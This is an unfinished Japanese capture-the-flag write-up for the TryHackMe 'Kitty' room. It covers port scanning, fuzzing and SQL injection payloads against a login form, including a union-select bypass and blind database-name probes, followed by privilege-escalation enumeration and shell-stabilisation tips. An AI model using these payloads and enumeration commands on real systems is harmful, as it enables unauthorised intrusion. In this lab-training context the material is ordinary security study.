# Kitty CTF

https://tryhackme.com/room/kitty

## Enumeration

```shell
TARGET=10.201.90.232
sudo bash -c "echo $TARGET   kitty.thm >> /etc/hosts"
```

### ポートスキャン

```shell
sudo nmap -sS -p- $TARGET

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

```sh
sudo nmap -sS -sV -p22,80 $TARGET

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```

SSH, HTTP

### ディレクトリ列挙

dirsearch で config.php などを発見。

```sh
[04:35:14] 200 -    1B  - /config.php
[04:35:26] 200 -  512B  - /index.php/login/
[04:35:31] 302 -    0B  - /logout.php  ->  index.php
[04:35:44] 200 -  564B  - /register.php
```

## HTTP

ユーザー登録できる。ログイン、ログアウト、別のユーザーを作ってログインしても、PHPSESSID は変わらず `t4ic0s1fnma6j8pjobipfbucgf` で固定。

register.php, index.php について sqlmap を実行したが何も出なかった。

### パラメータファジング

config.php のパラメータファジングしたが何も出なかった。

```sh
ffuf -u 'http://kitty.thm/config.php?FUZZ=1' -c -w /usr/share/wordlists/SecLists/Fuzzing/1-4_all_letters_a-z.txt -fs 1
```

POST

```sh
ffuf -u 'http://kitty.thm/config.php' -X POST -c -w /usr/share/wordlists/SecLists/Fuzzing/1-4_all_letters_a-z.txt -d 'FUZZ=1' -fs 1
```

welcome.php のパラメータも出ない。

```sh
ffuf -u 'http://kitty.thm/welcome.php?FUZZ=1' -c -w /usr/share/wordlists/SecLists/Fuzzing/1-4_all_letters_a-z.txt -H 'Cookie: PHPSESSID=t4ic0s1fnma6j8pjobipfbucgf' -fr 'in development'
```

PHPSESSID のファジングも失敗。

```sh
ffuf -u 'http://kitty.thm/welcome.php' -c -w /usr/share/wordlists/SecLists/Fuzzing/1-4_all_letters_a-z.txt -H 'Cookie: PHPSESSID=FUZZ' -fs 0
```

### ログインパスワードブルートフォース

kitty, admin についてブルートフォースを試みたが失敗。

### 再びSQLi

ユーザー名に下記指定すると、`SQL Injection detected. This incident will be logged!` と表示される。

```
kitty' or 1=1-- -
```

and にすると、welcome.php に転送される。末尾は `-- -` にしないと成功しないので、MySQLと判断できる。また、ユーザー名を `noexist` とするとログイン失敗になるので kitty ユーザーは存在する。

```
kitty' and 1=1-- -
```

下記でログインできる。

```
noexist' union select 1,2,3,4-- -
```

続いてスキーマを調べたいが、ほぼほぼ攻撃を検出されて失敗する。そもそもSELECTの結果が画面表示されないので、blind-based の手法が必要。

```
no' UNION SELECT 1,2,3,GROUP_CONCAT(0x7c,schema_name,0x7c) FROM information_schema.schemata-- -
```

下記の手法でDB名を特定することが可能。

```sh
# 成功
a' UNION SELECT 1,2,3,4 where database() like '%';-- -

# 失敗
a' UNION SELECT 1,2,3,4 where database() like 'a%';-- -
```

ChatGPTにスクリプトを書いてもらってDB名が判明。  
同様に、テーブル名と列名、内部データをダンプする。

# 続きは後日

## 権限昇格

```sh
find / -perm -u=s -type f -ls 2>/dev/null
```

```sh
find / -user <name> -type f -not -path "/proc/*" 2>/dev/null
find / -group <group> -type f -not -path "/proc/*" 2>/dev/null
```

```sh
getcap -r / 2>/dev/null
ls -al /var/backups
cat /etc/crontab
cat /etc/exports
```

## 振り返り

- 
- 

## メモ

### シェル安定化

```shell
# python が無くても、python3 でいける場合もある
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm

# Ctrl+Z でバックグラウンドにした後に
stty raw -echo; fg

#（終了後）エコー無効にして入力非表示になっているので
reset

# まず、他のターミナルを開いて rows, columns の値を調べる
stty -a

# リバースシェルで rows, cols を設定する
stty rows 52
stty cols 236
```

### SSH接続エラー

```sh
# no matching host key type found. Their offer: ssh-rsa,ssh-dss
# このエラーが出るのはサーバー側のバージョンが古いためなので、下記オプション追加。
-oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedAlgorithms=ssh-rsa
```
